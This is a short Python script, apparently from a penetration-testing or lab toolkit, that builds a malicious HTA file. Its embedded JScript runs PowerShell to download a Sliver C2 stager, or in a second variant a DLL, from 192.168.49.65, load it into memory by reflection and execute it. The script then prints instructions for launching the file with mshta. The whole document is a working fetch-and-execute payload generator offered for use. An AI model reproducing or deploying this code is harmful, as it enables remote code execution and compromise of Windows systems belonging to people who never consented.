PAYLOAD = """powershell.exe -c \\"$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.65/win_msf_sliver_stager.exe')\\";$assem = [System.Reflection.Assembly]::Load($data);[SliverStager.Stager]::Main()"""

# DLL Runner
PAYLOAD = """cmd.exe /c powershell.exe -c \\"$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.65/DLL-Runner-x64.dll');$assem = [System.Reflection.Assembly]::Load($data);$class = $assem.GetType('LeMans.Class1');$method = $class.GetMethod('ferrari');$method.Invoke(0, $null)\\" """

TEMPLATE = f"""
       <html>
       <head>
       <script language="JScript">
       var shell = new ActiveXObject("WScript.Shell");
       var res = shell.Run("{PAYLOAD}");
       </script>
       </head>
       <body>
       <script language="JScript">
       self.close();
       </script>
       </body>
       </html>
"""

print(TEMPLATE)

print('Run with: mshta http://192.168.49.65/foo.hta')
print('Or dl and run locally')
